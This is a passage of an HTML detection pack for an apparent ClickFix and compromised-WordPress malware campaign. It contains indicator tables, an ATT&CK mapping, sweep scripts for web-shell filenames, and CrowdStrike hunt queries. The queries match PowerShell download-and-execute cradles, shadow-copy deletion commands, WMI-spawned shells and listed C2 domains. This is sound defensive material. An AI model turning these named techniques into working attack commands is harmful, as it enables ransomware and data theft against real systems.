+      <tr><td>SHA256</td><td>3ed8f2cc8da4853fd770ff38f0cbce6d9d4a84e75a828fc0cec3e3ec60db94f9</td><td>High</td><td>detect</td><td>SimpleChatProxy (variant 1 of 2)</td><td>2027-02-21</td></tr>
+      <tr><td>SHA256</td><td>3ba161ca7b8dcf389ec3236c9ddfb943e9d1766181b1b81a227649cad46132a8</td><td>High</td><td>detect</td><td>SimpleChatProxy (variant 2 of 2)</td><td>2027-02-21</td></tr>
+      <tr><td>Path (context)</td><td>C:\Users\marks\source\, project dirs 0a_botnet / fake-captcha</td><td>Medium</td><td>enrich</td><td>Attacker developer-machine path artifacts leaked in exposed archives — useful for correlating future samples to this operator, not directly hunt-able on victim endpoints</td><td>2026-11-21</td></tr>
+      <tr><td>Site (context, not for blanket blocking)</td><td>maximumrock.ro, platinumcar.ca, norakremer.co.uk, pharmart.ae, ksr-racingparts.com</td><td>Medium</td><td>enrich</td><td>Compromised WordPress hosting sites cited as examples — these are victims, not attacker-owned infrastructure; do not blanket-block, use only to understand the pattern of hosting-provider/CMS compromise</td><td>2026-11-21</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="section" id="s5">
+  <div class="section-hdr"><span class="snum">05</span><h2>Affected Surface &amp; Telemetry Matrix</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Surface</th><th>Telemetry</th><th>Priority</th><th>Gap</th></tr>
+      <tr><td>Windows endpoints (ClickFix detonation, PowerShell/.NET chain, ransomware/stealer/worm payloads)</td><td><code>ProcessRollup2</code>/<code>SyntheticProcessRollup2</code>, <code>NetworkConnectIP4</code>, <code>DnsRequest</code>, <code>RegGenericValueUpdate</code>/<code>AsepValueUpdate</code>, <code>RansomwareOpenFile</code>, <code>NewExecutableWritten</code>/<code>PeFileWritten</code></td><td>Critical</td><td>None — fully covered where the Falcon sensor is deployed</td></tr>
+      <tr><td>Organization-hosted WordPress infrastructure (if any)</td><td><code>FileCreateInfo</code>/<code>NewScriptWritten</code> — only if the web-server host itself runs a Linux Falcon sensor</td><td>High (if applicable)</td><td><strong>GAP</strong> — most organizations' externally-hosted WordPress sites sit on shared/managed hosting with no Falcon sensor; rely on the native web-server sweep in Section 7 and the hosting provider's own file-integrity/WAF tooling instead</td></tr>
+      <tr><td>Browser-DOM level (fake CAPTCHA render, clipboard write)</td><td>No Falcon telemetry — this happens entirely inside the browser before any process is spawned</td><td>Medium</td><td><strong>GAP</strong> — not endpoint-visible by design; covered only by user-awareness training and web/DNS content filtering upstream of the browser</td></tr>
+      <tr><td>Removable media / USB device connect-disconnect events</td><td>No dedicated USB/removable-media-connect event confirmed in the current Falcon data-model reference</td><td>Medium</td><td><strong>GAP</strong> — hunt via the process-based discovery proxy in Q9 (<code>wmic logicaldisk</code>) rather than a native device-connect event</td></tr>
+      <tr><td>SMB share enumeration (NetworkShareScanner)</td><td><code>ProcessRollup2</code> (command-line proxy: <code>net view</code>/<code>net use</code>/<code>Get-SmbShare</code>); <code>NetworkConnectIP4</code> on port 445 for the network-layer view</td><td>Medium</td><td><strong>Partial</strong> — good behavioral coverage, but this command set is also used by legitimate IT tooling; pair with process-lineage context (Q9 TUNING note) before alerting</td></tr>
+      <tr><td>WMI-based lateral movement (VBS spreader)</td><td><code>ProcessRollup2</code> (<code>WmiPrvSE.exe</code> parent-child pattern)</td><td>Medium</td><td>None — standard Falcon coverage, shared with any WMI-based lateral-movement tradecraft</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="section" id="s6">
+  <div class="section-hdr"><span class="snum">06</span><h2>ATT&amp;CK Mapping</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Tactic</th><th>Technique</th><th>Name</th><th>Observed Behavior</th></tr>
+      <tr><td>Initial Access (WordPress side)</td><td>T1190</td><td>Exploit Public-Facing Application</td><td>Compromised WordPress sites entered via outdated core/plugin installations (one analyzed site unpatched since 2021, ~40 known vulnerabilities per secondary reporting)</td></tr>
+      <tr><td>Persistence (WordPress side)</td><td>T1505.003</td><td>Server Software Component: Web Shell</td><td>Hidden must-use plugin (<code>wp-sec.php</code>) with a hardcoded-credential REST upload endpoint; single-file web shell <code>wp-cssv.php</code>; file explorer with remote-fetch fallback <code>wp-verifyup.php</code></td></tr>
+      <tr><td>Initial Access (victim side)</td><td>T1204.004</td><td>User Execution: Malicious Copy and Paste</td><td>Fake CAPTCHA overlay instructs the victim to paste and run a PowerShell command via the Windows Run dialog (ClickFix)</td></tr>
+      <tr><td>Execution</td><td>T1059.001</td><td>Command and Scripting Interpreter: PowerShell</td><td>Two chained PowerShell stages preceding the .NET downloader/loader stages</td></tr>
+      <tr><td>Defense Evasion</td><td>T1564.003</td><td>Hide Artifacts: Hidden Window</td><td>PowerShell launched with <code>-w hidden</code></td></tr>
+      <tr><td>Defense Evasion</td><td>T1562.001</td><td>Impair Defenses: Disable or Modify Tools</td><td>PowerShell launched with <code>-ep bypass</code> to skip the execution-policy control</td></tr>
+      <tr><td>Command and Control</td><td>T1071.001</td><td>Application Layer Protocol: Web Protocols</td><td>HTTP(S) beaconing and file exfiltration to the rotating pool of compromised WordPress base-C2 sites</td></tr>
+      <tr><td>Command and Control</td><td>T1102</td><td>Web Service</td><td>Legitimate-looking, hijacked WordPress domains used as a rotating C2/distribution pool — the defining characteristic of this operation</td></tr>
+      <tr><td>Discovery</td><td>T1083</td><td>File and Directory Discovery</td><td>SilentDataCollector enumerates all files across fixed, removable, and network drives before selective exfiltration</td></tr>
+      <tr><td>Discovery</td><td>T1135</td><td>Network Share Discovery</td><td>NetworkShareScanner enumerates SMB shares to spread beyond the initial host</td></tr>
+      <tr><td>Discovery</td><td>T1120</td><td>Peripheral Device Discovery</td><td>NetworkShareScanner and the VBS spreader enumerate plugged-in USB/removable devices</td></tr>
+      <tr><td>Lateral Movement</td><td>T1047</td><td>Windows Management Instrumentation</td><td>VBS spreader laterally moves via remote process creation over WMI</td></tr>
+      <tr><td>Lateral Movement</td><td>T1091</td><td>Replication Through Removable Media</td><td>VBS spreader and NetworkShareScanner propagate to hard disks and removable media</td></tr>
+      <tr><td>Collection</td><td>T1113</td><td>Screen Capture</td><td>SilentDataCollector captures screenshots every 30 seconds while the victim is active; Check Point recovered ~31,000 such screenshots</td></tr>
+      <tr><td>Collection</td><td>T1056.001</td><td>Input Capture: Keylogging</td><td>SilentDataCollector's newer variants include a keylogger with valid-email-address detection</td></tr>
+      <tr><td>Collection</td><td>T1005</td><td>Data from Local System</td><td>SilentDataCollector compresses and encrypts operator-selected files for exfiltration</td></tr>
+      <tr><td>Collection</td><td>T1074.001</td><td>Data Staged: Local Data Staging</td><td>Selected files are compressed and encrypted locally before exfiltration</td></tr>
+      <tr><td>Impact</td><td>T1486</td><td>Data Encrypted for Impact</td><td>SilentEncryptor encrypts files; key derivation embeds the per-file password and machine name in the renamed filename. LockScreen displays a payment QR code as the extortion demand.</td></tr>
+      <tr><td>Impact</td><td>T1490</td><td>Inhibit System Recovery</td><td>Standard ransomware pre-encryption step (shadow-copy deletion / recovery inhibition) — included in this pack as a defense-in-depth behavioral hunt; not independently confirmed for SilentEncryptor specifically by the cited sources</td></tr>
+      <tr><td>Exfiltration</td><td>T1041</td><td>Exfiltration Over C2 Channel</td><td>Stolen files, screenshots, and WhatsApp-contact captures sent to the base C2 over the same WordPress-hosted infrastructure</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="section" id="s7">
+  <div class="section-hdr"><span class="snum">07</span><h2>Native Audit-Log Hunts</h2></div>
+  <div class="section-body">
+    <p>These checks cover surfaces Falcon does not natively tag with a dedicated event (Section 5 gaps) or that are faster to run directly than to wait on telemetry ingestion. Run them alongside the CQL queries in Section 8, not instead of them.</p>
+    <h3>Windows Run-dialog forensic residue and manual C2 egress check</h3>
+    <pre class="code"># RunMRU -- survives after process telemetry ages out; recovers the FULL pasted string
+Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' | Format-List
+
+# Manual DNS resolution check against the five confirmed C2 domains
+foreach ($d in @('v-k.com.ua','www.lapellelaser.pl','www.parsrulman.com','mectcalcutta.com','discherniation.com')) {
+  Resolve-DnsName $d -ErrorAction SilentlyContinue
+}</pre>
+    <h3>Ransom-note / renamed-file sweep (best-effort heuristic)</h3>
+    <p>Check Point states the per-file password and machine name are embedded in the renamed encrypted filename, but does not publish the exact format string. Treat the pattern below as a starting heuristic to triage, not a guaranteed match — confirm any hits by hand.</p>
+    <pre class="code">Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue |
+  Where-Object { $_.Name -match '^[A-Za-z0-9]{10,}[_-][A-Za-z0-9\-]+\.[A-Za-z0-9]{2,6}$' -and $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
+  Select-Object -First 200 FullName, LastWriteTime</pre>
+    <h3>Organization-hosted WordPress artifact sweep (only if you self-host WordPress — run via SSH/WP-CLI or an EDR script deployment)</h3>
+    <pre class="code"># Known attacker PHP artifacts and marker file
+find /var/www -type f \( \
+  -name 'dwnen.php' -o -name 'mu-uploader-installer.php' -o -name 'wp-sec.php' -o \
+  -name 'verify.php' -o -name 'store.php' -o -name 'proxy.php' -o \
+  -name 'wp-uploading.php' -o -name 'wp-delete.php' -o -name 'wp-cssv.php' -o \
+  -name 'wp-verifyup.php' -o -name 'stored_url.txt' -o -name 'activator.php' \
+\) -print 2&gt;/dev/null
+
+# Hidden must-use plugin directory -- MU plugins load automatically with no admin-panel activation step
+ls -la /var/www/*/wp-content/mu-plugins/ 2&gt;/dev/null
+grep -rl "wp-sec/v1/upload" /var/www/*/wp-content/ 2&gt;/dev/null
+
+# WordPress core/plugin currency (unpatched WordPress was the entry vector)
+wp core version --path=/var/www/site 2&gt;/dev/null
+wp plugin list --update=available --path=/var/www/site 2&gt;/dev/null</pre>
+  </div>
+</div>
+
+<div class="section" id="s8">
+  <div class="section-hdr"><span class="snum">08</span><h2>CrowdStrike LogScale CQL Hunt Queries</h2></div>
+  <div class="section-body">
+    <div class="cloud-sel">
+      <label for="cloud-region">Falcon cloud (drives "Open in Falcon"):</label>
+      <select id="cloud-region">
+        <option value="https://falcon.crowdstrike.com">US-1</option>
+        <option value="https://falcon.us-2.crowdstrike.com">US-2</option>
+        <option value="https://falcon.eu-1.crowdstrike.com">EU-1</option>
+        <option value="https://falcon.laggar.gcw.crowdstrike.com">US-GOV-1</option>
+        <option value="https://falcon.us-gov-2.crowdstrike.mil">US-GOV-2</option>
+      </select>
+      <span class="cloud-hint">Pick your tenant's cloud first &mdash; every "Open in Falcon" button below uses this selection.</span>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q1 · ClickFix detonation — explorer.exe parenting a hidden, policy-bypassed PowerShell</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-med">FP LOW-MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql1',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql1')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the defining ClickFix artifact — <code>explorer.exe</code> (the Run dialog) parenting <code>powershell.exe</code>/<code>pwsh.exe</code> with a hidden window, execution-policy bypass, and an inline download-and-execute command, with no <code>-File</code> argument present (i.e. the command is inline, not a saved script — the "no command-line file" pattern this pack was built to catch). <strong>FP:</strong> admin/helpdesk use of Win+R for legitimate hidden-window scripts, or RMM/deployment agents launching PowerShell hidden from an explorer.exe context.</p>
+<pre class="cql" id="cql1"><span class="cm">// HUNT: StopAndProtect ClickFix Run-dialog paste — explorer.exe parenting a hidden, policy-bypassed PowerShell download-and-execute with no -File argument</span>
+<span class="cm">// MITRE: T1204.004, T1059.001, T1564.003, T1562.001</span>
+<span class="cm">// CONF: high  FP: low-medium  COST: low | REQUIRES: ProcessRollup2 / SyntheticProcessRollup2</span>
+<span class="cm">// FALSE POSITIVES: admin/helpdesk use of Win+R with legitimate hidden-window scripts; some RMM/deployment agents launch PowerShell hidden from an explorer.exe context</span>
+<span class="cm">// TUNING: exclude UserName in your admin/helpdesk group and known deployment service accounts; scope to standard users first</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| ParentBaseFileName=/^explorer\.exe$/i
+| FileName=/^(powershell|pwsh)\.exe$/i
+| CommandLine=/(-w(indowstyle)? +hidden|-ep +bypass|-executionpolicy +bypass)/i
+| CommandLine=/(iex|invoke-expression|downloadstring|downloadfile|net\.webclient)/i
+| !CommandLine=/-file\b/i
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine, SHA256HashData], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q2 · RunMRU registry residue — pasted ClickFix command</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql2',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql2')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the forensic residue of the paste. Windows records every Run-dialog entry in <code>RunMRU</code>, so this fires even after the process itself has aged out of retention, and recovers the full original pasted string. <strong>FP:</strong> genuine admin use of the Run dialog for PowerShell troubleshooting.</p>
+<pre class="cql" id="cql2"><span class="cm">// HUNT: RunMRU value containing a PowerShell download-and-execute cradle (ClickFix forensic artifact)</span>
+<span class="cm">// MITRE: T1204.004</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: RegGenericValueUpdate / AsepValueUpdate</span>
+<span class="cm">// FALSE POSITIVES: admins typing powershell/iex into Run for legitimate troubleshooting</span>
+<span class="cm">// TUNING: filter to standard-user accounts; a ClickFix paste is a long single-line string, easy to eyeball once returned</span>
+#event_simpleName=/^(RegGenericValueUpdate|AsepValueUpdate)$/
+| RegObjectName=/RunMRU/i
+| RegStringValue=/(powershell|pwsh).*(iex|downloadstring|net\.webclient|-ep bypass)/i
+| table([@timestamp, ComputerName, UserName, RegObjectName, RegValueName, RegStringValue], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q3 · Reference to the ClickFix entry script — vcapcha.ps1</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql3',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql3')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the campaign's known entry-script name, whether referenced in a command line (the script is fetched via <code>DownloadString</code> and run in-memory, so it appears as a URL string in the command) or, less commonly, present as an on-disk file basename. <strong>FP:</strong> none identified — this filename has no legitimate use.</p>
+<pre class="cql" id="cql3"><span class="cm">// HUNT: Reference to the StopAndProtect ClickFix entry script (vcapcha.ps1) in a command line or as an on-disk file</span>
+<span class="cm">// MITRE: T1204.004, T1059.001, T1105</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: ProcessRollup2 / SyntheticProcessRollup2</span>
+<span class="cm">// FALSE POSITIVES: none identified</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| CommandLine=/vcapcha\.ps1/i or FileName=/^vcapcha(\.ps1)?$/i
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine, SHA256HashData], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q4 · PowerShell writes/executes a new PE from a user-writable path (downloader chain)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql4',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql4')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the moment the PowerShell→.NET downloader/loader chain detonates — PowerShell writing a new PE into Temp/AppData/ProgramData. <strong>FP:</strong> legitimate PowerShell-based installers/updaters that self-extract or download a helper binary to a temp path.</p>
+<pre class="cql" id="cql4"><span class="cm">// HUNT: PowerShell writes a new PE to a user-writable directory — StopAndProtect PS-to-.NET downloader/loader chain</span>
+<span class="cm">// MITRE: T1105, T1027, T1059.001</span>
+<span class="cm">// CONF: medium  FP: medium  COST: low | REQUIRES: NewExecutableWritten / PeFileWritten</span>
+<span class="cm">// FALSE POSITIVES: legitimate PowerShell-based installers/updaters that self-extract or download a helper binary to Temp/AppData</span>
+<span class="cm">// TUNING: allowlist known-good installer/updater ContextBaseFileName values once baselined; narrow TargetFileName further to your standard temp-path conventions</span>
+#event_simpleName=/^(NewExecutableWritten|PeFileWritten)$/
+| ContextBaseFileName=/^(powershell|pwsh)\.exe$/i
+| TargetFileName=/\\(Temp|AppData|ProgramData)\\/i
+| table([@timestamp, ComputerName, UserName, ContextBaseFileName, TargetFileName, SHA256HashData], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q5 · Known StopAndProtect stage hash — execution or file write</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql5',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql5')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> exact-hash execution or write of any of the 21 confirmed StopAndProtect binaries across every stage — both PowerShell scripts, all three .NET downloader variants, all three .NET loader variants, and all six payload modules (SilentEncryptor, NetworkShareScanner, LockScreen, SilentDataCollector, VBS spreader, SimpleChatProxy). <strong>FP:</strong> none identified — exact-hash match against confirmed malicious samples.</p>
+<pre class="cql" id="cql5"><span class="cm">// HUNT: Execution or file-write of a known StopAndProtect stage hash (PowerShell/.NET loaders + all six payload modules)</span>
+<span class="cm">// MITRE: T1105, T1204.004, T1486, T1490, T1039, T1091</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: ProcessRollup2 / SyntheticProcessRollup2 / PeFileWritten</span>
+<span class="cm">// FALSE POSITIVES: none identified</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2|PeFileWritten)$/
+| in(SHA256HashData, values=[
+    "cab7f141fd6f2c58055b3731ef6a64b8a2d4d88a974770b047da19c0904322f0",
+    "cc8aa2bd7bf74ca0bbc5cb03a7b18eae73094b450d11654528c05685fe12e0c9",
+    "99bcb531d6dd3c93d3f28f03d6e4659c865a4ffbd2fb514e809017f3446a940b",
+    "8337bf29100a5871b1275227006dc2a43b21b751e5ce7e2032364fd78af59ac5",
+    "4dee2fe98d4da75ffb259c03b50202212dafc85691429a28641a8068eddea504",
+    "9765b1342cc7eb982a73bb1f94c6c500b63dc817073b76ea926c1097078d3527",
+    "7d3604d0728b242c72bd144b8661ebf63c1042a4f5dd441bc8c8507c701df20c",
+    "976cfa57e1efacbe517b7e3441e9473d275ec1d9ad8ab69ddf8ae3a966aaa153",
+    "b79b9b027f76579555069a7506d946648a8cb3126c0dda837dc9fee0e5c79489",
+    "65550f6d0ffec8421f703cdc7273d9c0563b3d480fe6702bad294a18afe72143",
+    "0080d0dd72eda4850a02e51c0e5c6f768423dfe970cafae2ab52ceee75972b40",
+    "8d1e23630a6695fa9c793d73832f59436c98bba30ed81c16d01b549bd17feab4",
+    "10babb15e08f9fbd72cce11713a273b971c910dd5bdb989a3f6ff4d9c8e372c0",
+    "f042240c3de00c46dee625916bf246b7e87481e4081a6a97208b091409766e41",
+    "11a635d70444605ede1de0aa227a9fd7cfa4554e75bea93ce18b639ca571a42e",
+    "2adbb2c206be7f23bf77f8f50d1ac0f809511c0b4591421931f81a6eaa42c68c",
+    "38602b76f6c65644b01fa4d81708251c159a883253cda8876396dc7212324ab9",
+    "23cbabfe3ca3a7f1eb365f772d6a4ed8095cb8f7755622cc82e804478259dc70",
+    "b3dff910b350ace27d64cbd79405cb154a1967e366d7b88170c3e8303b1d08ad",
+    "3ed8f2cc8da4853fd770ff38f0cbce6d9d4a84e75a828fc0cec3e3ec60db94f9",
+    "3ba161ca7b8dcf389ec3236c9ddfb943e9d1766181b1b81a227649cad46132a8"
+  ])
+| table([@timestamp, ComputerName, UserName, FileName, ParentBaseFileName, CommandLine, SHA256HashData], limit=500)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q6 · DNS resolution of a confirmed WordPress-hosted C2 domain</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql6',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql6')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> any host resolving one of the five confirmed base-C2 domains. No resolved IPs were published for these domains, so this pack detects at the DNS layer rather than by IP. <strong>FP:</strong> none identified — these are compromised third-party sites repurposed as attacker infrastructure, not general-purpose services.</p>
+<pre class="cql" id="cql6"><span class="cm">// HUNT: DNS resolution of a StopAndProtect WordPress-hosted base C2 domain</span>
+<span class="cm">// MITRE: T1071.001, T1102</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: DnsRequest</span>
+<span class="cm">// FALSE POSITIVES: none identified</span>
+#event_simpleName=DnsRequest
+| in(DomainName, values=["v-k.com.ua","www.lapellelaser.pl","www.parsrulman.com","mectcalcutta.com","discherniation.com"], ignoreCase=true)
+| table([@timestamp, ComputerName, UserName, DomainName], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q7 · Mass file rename/encryption volume spike (SilentEncryptor impact)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-med">COST MED</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql7',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql7')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> a per-host, per-user spike in file-touch volume consistent with ransomware detonation. <strong>FP:</strong> bulk operations from backup/sync/indexing/AV full-disk-scan software, or a user re-encoding a large personal media library.</p>
+<pre class="cql" id="cql7"><span class="cm">// HUNT: Mass file encryption/rename volume spike consistent with SilentEncryptor detonation</span>
+<span class="cm">// MITRE: T1486</span>
+<span class="cm">// CONF: medium  FP: medium  COST: medium | REQUIRES: RansomwareOpenFile</span>
+<span class="cm">// FALSE POSITIVES: bulk file operations from backup/sync/indexing/AV full-disk-scan software</span>
+<span class="cm">// TUNING: exclude known backup/sync/AV process names once correlated with UserName; this is a coarse volumetric signal — always pair with Q5 (hash match) or Q1/Q3 (ClickFix chain) for context before treating as an incident</span>
+#event_simpleName=RansomwareOpenFile
+| groupBy([ComputerName, UserName], function=count(as=FilesTouched))
+| FilesTouched &gt; 100
+| sort(FilesTouched, order=desc)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q8 · Shadow-copy deletion / recovery-inhibition command</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql8',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql8')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> the standard ransomware pre-encryption step of deleting shadow copies or disabling recovery options. <strong>Note:</strong> included as a defense-in-depth behavioral hunt; shadow-copy deletion was not independently confirmed for SilentEncryptor specifically by the cited sources. <strong>FP:</strong> legitimate backup-software maintenance windows that manage VSS snapshots.</p>
+<pre class="cql" id="cql8"><span class="cm">// HUNT: Shadow-copy deletion or recovery-inhibition command execution (generic ransomware pre-encryption step)</span>
+<span class="cm">// MITRE: T1490</span>
+<span class="cm">// CONF: medium  FP: low  COST: low | REQUIRES: ProcessRollup2</span>
+<span class="cm">// FALSE POSITIVES: legitimate backup-software maintenance windows that manage VSS snapshots</span>
+<span class="cm">// TUNING: scope to non-backup-service accounts once your backup tooling is baselined</span>
+#event_simpleName=ProcessRollup2
+| CommandLine=/(vssadmin.*delete|wmic.*shadowcopy.*delete|bcdedit.*recoveryenabled.*no|wbadmin.*delete.*catalog)/i
+| table([@timestamp, ComputerName, UserName, CommandLine], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q9 · SMB-share and removable-media discovery (NetworkShareScanner proxy)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql9',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql9')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> network-share and removable-drive discovery consistent with the NetworkShareScanner SMB/USB worm module. <strong>FP:</strong> IT asset-management scripts, legitimate helpdesk use of <code>net view</code>/<code>net use</code>, backup software enumerating shares.</p>
+<pre class="cql" id="cql9"><span class="cm">// HUNT: Network-share and removable-media discovery consistent with the NetworkShareScanner SMB/USB worm module</span>
+<span class="cm">// MITRE: T1135, T1120, T1039</span>
+<span class="cm">// CONF: medium  FP: medium  COST: low | REQUIRES: ProcessRollup2</span>
+<span class="cm">// FALSE POSITIVES: IT asset-management scripts, legitimate net view/net use usage by helpdesk, backup software enumerating shares</span>
+<span class="cm">// TUNING: correlate with Q1/Q3 process lineage (same host, same session) before treating as high-confidence; exclude known IT/backup service accounts</span>
+#event_simpleName=ProcessRollup2
+| CommandLine=/(net +view|net +use|Get-SmbShare|wmic +logicaldisk)/i
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q10 · WMI remote process creation (VBS spreader lateral movement)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql10',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql10')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> <code>WmiPrvSE.exe</code> spawning a script/command interpreter — the VBS spreader's documented lateral-movement mechanism (remote process creation via WMI). <strong>FP:</strong> legitimate RMM/systems-management tooling (SCCM, monitoring agents) also drives WmiPrvSE-spawned children.</p>
+<pre class="cql" id="cql10"><span class="cm">// HUNT: WmiPrvSE spawning a command/script interpreter — VBS spreader lateral movement via remote process creation over WMI</span>
+<span class="cm">// MITRE: T1047, T1091</span>
+<span class="cm">// CONF: medium  FP: medium  COST: low | REQUIRES: ProcessRollup2</span>
+<span class="cm">// FALSE POSITIVES: legitimate RMM/systems-management tooling (SCCM, monitoring agents) also drive WmiPrvSE-spawned children</span>
+<span class="cm">// TUNING: allowlist your known RMM/monitoring agent ImageFileName values once baselined</span>
+#event_simpleName=ProcessRollup2
+| ParentBaseFileName=/^wmiprvse\.exe$/i
+| in(FileName, values=["cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe"], ignoreCase=true)
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine], limit=200)</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q11 · WordPress attacker-artifact file write (org-hosted WordPress with a Falcon Linux sensor only)</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql11',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql11')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> a file write matching one of the named StopAndProtect WordPress artifacts (hidden MU-plugin installer, web shell, verify-plugin components, marker file). Only fires on a Linux/web-server host that carries a Falcon sensor — most managed WordPress hosting does not. <strong>FP:</strong> none identified — these filenames are attacker-specific.</p>
+<pre class="cql" id="cql11"><span class="cm">// HUNT: File write of a known StopAndProtect WordPress attacker-artifact filename (web shell / hidden uploader / verify-plugin components)</span>
+<span class="cm">// MITRE: T1505.003, T1190</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: Linux sensor on the web-server host</span>
+<span class="cm">// FALSE POSITIVES: none identified</span>
+<span class="cm">// ⚠ validate in tenant: event name below is not in the standard Falcon file-event set (PeFileWritten/ElfFileWritten/ZipFileWritten/DocumentFileWritten/JarFileWritten cover typed writes only — none is a generic script/text write). Confirm the correct file-write event for your Linux sensor version in LogScale's field picker before relying on this query.</span>
+#event_simpleName=/^(FileCreateInfo|NewScriptWritten)$/
